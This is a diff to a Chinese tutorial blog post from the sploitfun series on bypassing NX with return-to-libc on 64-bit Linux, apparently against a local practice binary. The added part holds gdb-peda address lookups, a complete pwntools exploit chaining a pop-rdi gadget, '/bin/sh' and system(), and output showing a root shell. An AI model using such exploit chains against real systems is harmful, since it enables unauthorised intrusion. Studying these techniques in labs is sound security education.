@@ -2,7 +2,7 @@
 layout: post
 title: 通过return-to-libc绕过NX
 excerpt: "sploitfun系列教程之2.1 return-to-libc"
-categories: [未完待续]
+categories: [sploitfun系列教程]
 comments: true
 ---
 
@@ -294,7 +294,9 @@ echo 0 > /proc/sys/kernel/randomize_va_space
 chmod +x ret2libc
 ```
 
-相同的方法查找到libc基地址`7ffff7a0d000`,`pop rdi ; ret`地址为`0x00000000004006a3`
+**offset查找可以通过rbp值来计算**
+
+相同的方法查找`pop rdi ; ret`地址为`0x00000000004006a3`
 
 ps:可以使用如下方法查找字符串
 
@@ -307,7 +309,33 @@ ret2libc : 0x60070b --> 0x68732f6e69622f ('/bin/sh')
     libc : 0x7ffff7b94cc9 --> 0x68732f6e69622f ('/bin/sh')
 
 ```
+查找system地址并验证
+```bash
+gdb-peda$ p &system
+$1 = (<text variable, no debug info> *) 0x7ffff7a50270 <__libc_system>
+gdb-peda$ x/wx 0x7ffff7a50270
+0x7ffff7a50270 <__libc_system>:	0x83485355
 
-竟然卡住了
+```
+最终exp
+```python
+from pwn import *
 
-https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/
+r = remote('127.0.0.1', 4000)
+
+raw_input('#')
+payload = 'A' * 104+p64(0x00000000004006a3)+p64(0x40070b)+p64(0x7ffff7a50270)
+r.send(payload)
+#print r.recvall()
+r.interactive()
+
+```
+最终结果
+```bash
+python mortyexp.py 
+[+] Opening connection to 127.0.0.1 on port 4000: Done
+#
+[*] Switching to interactive mode
+$ id
+uid=0(root) gid=0(root) 组=0(root)
+```
